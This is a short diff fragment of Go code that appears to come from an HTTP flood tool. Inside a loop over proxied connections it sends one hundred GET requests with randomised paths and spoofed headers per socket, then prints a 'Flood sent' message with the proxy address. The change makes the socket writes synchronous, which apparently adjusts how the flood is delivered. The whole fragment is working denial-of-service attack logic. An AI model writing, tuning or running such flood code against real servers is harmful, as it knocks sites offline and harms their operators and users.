@@ -144,7 +144,7 @@ func main() {
 						defer s.Close()
 						for i := 0; i < 100; i++ {
 							headers = "GET " + path + randchars() + " HTTP/1.1\r\nHost: " + host + "\r\n" + UserAgent + Connection + c + p + Accept + "\r\n"
-							go s.Write([]byte(headers))
+							s.Write([]byte(headers))
 						}
 						fmt.Println("Flood sent " + proxyAddress)
 					}
